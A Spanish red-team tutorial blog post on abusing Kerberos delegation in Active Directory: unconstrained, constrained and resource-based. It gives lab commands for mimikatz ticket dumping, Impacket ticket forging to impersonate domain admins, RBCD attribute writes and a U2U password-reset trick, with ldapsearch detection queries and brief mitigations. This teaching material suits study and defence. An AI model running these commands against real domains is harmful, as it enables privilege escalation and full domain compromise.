---
layout: post2
language: es
title:  "Kerberos: Delegaciones"
categories:  es Kerberos Delegaciones
tags: [ "Red Team", "AD", "Delegaciones"]
---

## Índice
---
1. [Unconstrained delegation](#unconstrained-delegation)
	1. [Como detectar la caracteristica.](#como-detectar-la-caracteristica)
	2. [Como abusar de Unconstrained Delegation](#como-abusar-de-unconstrained-delegation)
2. [Constrained delegation](#constrained-delegation)
	1. [Como detectar constrained delegation](#como-detectar-la-característica-constrained-delegation)
	2. [Como abusar de Constrained Delegation](#como-abusar-de-constrained-delegation)
4. [Resource-based constrained delegations (RBCD)](#resource-based-constrained-delegation)
	1. [Como detectar constrained delegation](#como-detectar-la-característica-rbcd)
	2. [Abusar RBCD con permisos para crear maquinas o cuenta con SPN](#abusar-rbcd-con-permisos-para-crear-maquinas)
	3. [Abusar RBCD sin SPN ni permisos para crea maquinas](#abusar-rbcd-sin-spn-ni-permisos-para-crea-maquinas)
6. [Posibles mitigaciones](#posibles-mitigaciones)

---

# Kerberos: Delegaciones

Las delegaciones es una característica que tienen los entornos de directorio activo de windows, su implementación tiene la función de que un servicio pueda realizar acciones en nombre de un usuario que se halla autenticado en dicho servicio. Por ejemplo, si un servidor web con autenticación, *Kerberos*, tiene una funcionalidad de subida de fichero, la cual se realiza en un servidor de ficheros, para poder hacer que el servicio web pueda realizar acciones en nombre del usuario autenticado, en el servidor de ficheros, utiliza las delegaciones de windows.    
 
<p align="center">
   <img src="/assets/img/delegacion.png">
</p>

 
Una mala configuración de esta característica puede hacer que un usuario pueda realizar acciones en nombre de otros usuarios sin el consentimiento de estos mismos. Existen tres tipos de Abusos de dicha cualidad. **Unconstrained delegation**, **Constrained delegation**, **Resource- base constrained delegation(RBCD)**
<br>

---

1. ## Unconstrained delegation

En este caso la delegación permite que el usuario pueda impersonar a cualquier usuario que haya logueado en el servicio, esto es por que se almacena una copia del TGT al realizar la autenticación, esto permite que puedan generarse TGS en su nombre para ser utilizados en otros servios, por lo que si se consigue realizar con éxito, y existe una copia del TGT de un administrador de dominio en el equipo podría utilizarse para realizar acciones como *DCsync* en nombre de dicho administrador de dominio.

Esto es debido a el servicio que pose la característica *SeEnableDelegation* activa, que se consigue activando la opción *Confiar en este equipo para la delegación a cualquier servicio (solo Kerberos)*

<p align="center">
   <img src="/assets/img/SeEnableDelegation.png">
</p>


Esto modifica el *userAccountControl* y añade la opción *TrustedForDelegation* que permite aprovecharnos de esta delegación.

<p align="center">
   <img src="/assets/img/TrustedForDelegation.png">
</p>



   1. ### Como detectar la característica

Para detectar la vulnerabilidad mediante ldap search necesitamos, y debemos filtrar por maquinas y por el valor *524288* en el *userAccountControl*. Un ejemplo de petición sería.
```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

A lo que aparecerá una lista con las maquinas que tienen activadas esta funcionalidad

<p align="center">
   <img src="/assets/img/Uncosldapsearch.png">
</p>

Impacket tine la tool `findDelegation` que nos muestra todos las delegaciones en el dominio siempre que tengamos credenciales

<p align="center">
   <img src="/assets/img/uncdimpa.png">
</p>


   2. ### Como abusar de Unconstrained Delegation
  
En nuestro caso, vemos que el equipo con nombre `WINDOWS10` tiene el el atributo `userAccounControl` con el valor `524288` como vimos con el comando anterior de `ldapsearch`.

Para explotarlo usaremos un usuario del cual tenemos credenciales y sin privilegios elevados, `retard`
<p align="center">
   <img src="/assets/img/userlp.png">
</p>

Para aprovechar esta vulnerabilidad usaremos [mimikat](https://github.com/gentilkiwi/mimikatz) este software nos dejara, una vez dentro del equipo, listar los TGT dentro de la maquina, y como tiene `unconstrained` podremos coger uno de estos tickets para usarlo en nuestro beneficio.

Para `dumpear` los tickets dentro del equipo usamos `mimikatz.exe "privielge::debug" "sekurlsa::ticekts /export" "exit"` de hay cogemos el que nos interesa, en este caso el de un admin que tenga sesion en el DC01 DC01, y lo usamos con impacket en nuestra maquina.
<p align="center">
   <img src="/assets/img/mimiadmins.png">
</p>
El usuario `acapaz` es domain admin del dominios
<p align="center">
   <img src="/assets/img/acapaz.png">
</p>

Con este TGT podremos hace acciones como si fuéramos el, para usarlo podemos usar mimikatz, usando `kerberos::ppt` y la ruta dek tgt
<p align="center">
   <img src="/assets/img/tgtacapaz.png">
</p>
Con esto ya tendremos permisos para  hacer acciones sobre el dc `10.10.10.33` en este caso
<p align="center">
   <img src="/assets/img/dcdir.png">
</p>

2. ## Constrained delegation

Esta delegación es necesario tener una cuneta de usuario o cuenta maquina, comprometida y con Service Principal Name(SPN), ademas debe tener el atributo `UserAccountControl` con el valor `TRUSTED_TO_AUTH-FOR_DELEGATION` en el parámetro `mds-allowedtodelegatoto` aparecerá el nombre del servicio y la maquina sobre la que se tiene la opción de delegar.

Además se necesita una cuenta conq la opción de `confiar en este equipo para la delegación sólo a los servicios especificados`, dependiendo de los servicios que tenga delegado se podrán realizar diferentes acciones.

Aquí una lista de algunos de los servicios y ejemplos de acciones que podría realizar un usuario con dichos permisos:

- cifs: Permite realizar conexiones por smb, pudiendo, incluso, realizar ataques como secretdump
- ldap: Permite realizar consultas ldap y modificaciones sobre el Directorio activo, como modificar el valor del campo `msds-Credential-Links`
- http: Permite realizar conexiones por http


Con esto podemos impersonar a cualquier usuario, incluido a los administradores de dominio, dentro de la maquina *vulnerable*

  1. ### Como detectar la característica constrained delegation

Para detectar la vulnerabilidad mediante ldap search necesitamos, primero conocer si el usuario que tenemos vulnerado tiene SPN para ello realizaremos una consulta con ldap similar a esta, 
```ladpsearch
`ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=user) (sAMAccountName=constraineduseser))"
```

Sin configurar
<p align="center">
   <img src="/assets/img/userconst.png">         
</p>


Configurado
<p align="center">


   <img src="/assets/img/userconstconf.png">
</p>

Luego debemos filtrar por las cuentas con el `msds-allowedtodelegateto` con contenido, para ello podemos realizar la siguiente consulta ldap, en la que veremos al usuarios con la configuración del SPN que luego delegará la maquina victima.

```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
```

<p align="center">
   <img src="/assets/img/constrainmachine.png">
</p>

  
  2. ### Como abusar de Constrained Delegation
  
En nuestro caso, vemos que el equipo con nombre `WINDOWS10` tiene el el atributo `msds-allowedtodelegateto` con el valor `cifs/brain.body` y el usuario `constraineduseser` tiene el  `msDS-AllowedToDelegateTo` hacia el servicio *cifs* de la maquina *Windows10* como vimos con el comando anterior de `ldapsearch`.

Para poder abusar de esto usaremos `impacket` la tool `getST.py` nos generará un TGS impersonando al usuario `administrador` para el servicio cifs de la maquina `Windows10`

```command
getST.py -spn cifs/Windows10.brain.body -impersonate administrador brain.body/constraineduseser:Marzo,24
```

Después solo habrá que utilizar el ticket generado para impersonar el usuario, con el servicio `cifs` podremos, por ejemplo, listar la maquina como si fuéramos el administrador del dominio

```command
export KRB5CCNAME=$HOME/administrador.ccache
smbclient.py -k -no-pass windows10.brain.body
use C$
```

<p align="center">
   <img src="/assets/img/ConstrainedDelegation.png">
</p>
En el caso de que no se pueda delegar en dicha cuenta, por que tenga la opción `La cuenta es importante y no se puede delegar`aparecerá el siguiente error
<p align="center">
   <img src="/assets/img/delegationnotallowed.png">
</p>
Mediante esta consulta de ldap, se puede comprobar si la cuenta es delegable o no comprobando si el `UserAccountControl` tiene el siguiente valor `1048576` de la siguiente forma:

```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=user)(useraccountcontrol:1.2.840.113556.1.4.803:=1048576))"
```


4. ## Resource based constrained delegation 
En este caso es necesario tener una cuenta con permisos de escritura, como `Gener write` sobre una cuenta maquina, de esta forma podrá escribir el atroibuto `msDS-AllowedToActOnBehalfOfOtherIdentity` de dicha maquina para poder impersonar cualquier usuario del AD dentro de la misma, a no ser que dicho usuario este protegidco contra delegaciones.

  1. ### Como detectar la característica RBCD
Con **pywerview** podemos realizar una consulta para ver las acls del dominio referente a un objeto:
`pywerview get-objectacl -u usuario_pwned -w dominio.local -t dc01.dominio.local --resolve-sids --resolve-guids --name objeto_del_ad
<p align="center">
   <img src="/assets/img/genericwrite.png">
</p>
Con esto podemos observar que hay dos usuarios con permisos de escritura sobre la maquina *Windows10*, ninguna de estas maquinas pose SPN como puede verse con el comando
`ldapsearch -v -x -D "usuario@dominio.local" -w Contraseña -b "DC=dominio,DC=local" -H "ldap://dc01.dominio.local" "(&(objectCategory=user)(ServicePrincipalName=*)) | grep sAMAccountName"`

<p align="center">
   <img src="/assets/img/SPNs.png">
</p>

Al no poseer una cuenta vulnerada con un SPN asociado, existen dos formas de explotar esta configuración, dependerá de si tenemos permisos con el usuario vulnerado para crear maquinas o no podemos crear maquinas.


2. ### Abusar RBCD con permisos para crear maquinas
Nuestro usuario tiene permisos para crear maquinas, por lo que primero que hacemos es crear la maquina que utilizaremos para abusar.

`addcomputer.py -computer-name 'testrbcd' -computer-pass RBCDrules -dc-ip dc01.brain.body brain.body/retard`
<p align="center">
   <img src="/assets/img/addmachine.png">
</p>

Después añadiremos la cuenta creada en el parámetro *msDS-AllowedToActOnBehalfOfOtherIdentity*  de la maquina *Windows10*, para eso usamos el script `rbcd.py` de *impacket*:
`rbcd.py -delegate-to 'WINDOWS10$' -action 'write' -delegate-from 'testrbcd$' -dc-ip dc01.brain.body brain.body/retard`
<p align="center">
   <img src="/assets/img/rbcd.png">
</p>

Despues tan solo deberemos generar un ticket con las credenciales de la cuenta maquina que hemos creado e impersonar a un, por ejemplo, domain admin para acceder a la maquina *Windows 10*
`getST.py -spn cifs/Windows10.brain.body -impersonate acapaz -dc-ip dc01.brain.body brain.body/testrbcd$`

<p align="center">
   <img src="/assets/img/impersonar.png">
</p>
Después solo deberemos exportar el ticket ccache generado con *getST* e impersonaremos al usuario dentro de esa maquina
`export KRB5CCNAME=$(pwd)/acapaz@cifs_Windows10.brain.body@BRAIN.BODY.ccache`
<p align="center">
   <img src="/assets/img/exportarticket.png">
</p>


**Importante** 
En el paso de generar el TGS, es importante introducir el FQDN completo de la maquina de lo contrario, aunque generará un TGS este no tendrá los permisos que deseas al no ser el servicio correcto
<br><span style="color:red;">cifs/Windows10</span><br>
<span style="color:green;">cifs/Windows10.brain.body</span>



3. ### Abusar RBCD sin SPN ni permisos para crea maquinas
En este caso suponemos que no tenemos permisos para crear maquinas, ni una cuenta con spn, en este caso, solo disponemos de la cuenta *userrbcd*, vemos los permisos que tienen el usuario sobre la maquina *Windows10* 
<p align="center">
   <img src="/assets/img/Permiso.png">
</p>

Intentamos crear una maquina, pero no tenemos permisos
<p align="center">
   <img src="/assets/img/sinpermiso.png">
</p>

En este caso debemos realizar la modificación del atributo *AllowedToActOnBehalfOfOtherIdentity* como viene explicado [aqui](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

*Hay que tener en cuenta que este caso habrá que modificar la contraseña del usuario por lo que podría quedar innaccesible, y s eusará la tecnica Pass The Ticket*

 Esta tecnica consiste en modificar la contraseña del usuario por el hash rc4 utilizado en el *ticketsession key* de un TGT del usuario, para esto necesitaremos un impacket modificado que podemos obtener de:
`https://github.com/SecureAuthCorp/impacket`

Lo primero que hacemos es con el usuario, el clual tiene *Generic Write* sobre la maquina, modificamos el valor de *AllowedToActOnBehalfOfOtherIdentity* introduciendo al propio usuario

`rbcd.py -delegate-to 'Windows10$' -action 'write' -delegate-from 'userrbcd' -dc-ip dc01.brain.body brain.body/userrbcd`
<p align="center">
   <img src="/assets/img/nospnrbcd.png">
</p>
Después generamos un ticket TGT para el usuario con el RBCD, en este caso el usuario se llama `userrbcd`, del cual disponemos la password o el hash, en este caso hacemos PASS THE HASH pero valdria con la password.
`pypykatz crypto nt 'Contraseña'`
`getTGT.py -hashes :HASH_DELCOMANDO_ANTERIOR brain.body/userrbcd`
<p align="center">
   <img src="/assets/img/PTH1.png">
</p>


Tras esto con *describeticket.py* sobre el ccache que acabamos de crear y cogemos el rc4 del ticket  session key
`describeTicket.py userrbcd.ccache`

<p align="center">
   <img src="/assets/img/describe.png">
</p>


Usamos ese hash como contraseña del usuario, por esto el usuario solo podrá utilizarse con pass the hash a partir de ahora

`smbpasswd.py -newhashes :d3c298be6a1c28214c10f89d50b30e8a brain.body/userrbcd@dc01.brain.body`
<p align="center">
   <img src="/assets/img/changepass1.png">
</p>


Una vez puesta la contraseña del usuario igual que el hash rc4 the ticket sessionKey del ticket el DC podrá descifrar el ticket para utilizarlo como U2U e impersonar a un usuario DAdmin en la maquina vulnerable, exportamos el TGT creado antes 
`export KRB5CCNAME=userrbcd.ccache`

y generamos un tgs para un DA en la maquina como un RBCD normal
`getST.py -u2u -impersonate acapaz -spn "cifs/windows10.brain.body" -k -no-pass brain.body/userrbcd`

Con ese nuevo ticket podemos acceder a la maquina como acapaz(domainAdmin)
<p align="center">
   <img src="/assets/img/exito.png">
</p>


Después podemos regresar la password normal con smbpasswd y pass the hash
<p align="center">
   <img src="/assets/img/passrestore.png">
</p>


5. ## Posibles mitigation

Para evitar ser objetivo de este tipo de ataques es importante deshabilitar las delegaciones siempre que sea posible, en caso de que sea necesario seria recomendable revisar que usuarios poseen permisos para realizar estas delegaciones evitando que lo posean usuarios que no vayan a utilizarlo. 

Además se debería es habilitar la opción `La cuenta es importante y no se puede delegar` para las cuentas que tienen privilegios elevados

<p align="center">
   <img src="/assets/img/importante.png">
</p>



---

<br>
## References
- *https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos_Delegation.pdf*a
- *https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation*
- *https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/*
- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
- https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html
- https://github.com/ShutdownRepo/impacket/tree/getST-u2u
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
 


## Agradecimientos
- [Mario Bartolome](https://github.com/MarioBartolome) - *Por la incansable ayuda e inspiración* 
- [Raul Redondo](https://rayrt.gitlab.io/) - Su ayuda solvento mi agonía con el fqdn en los servicios al generar los TGS...
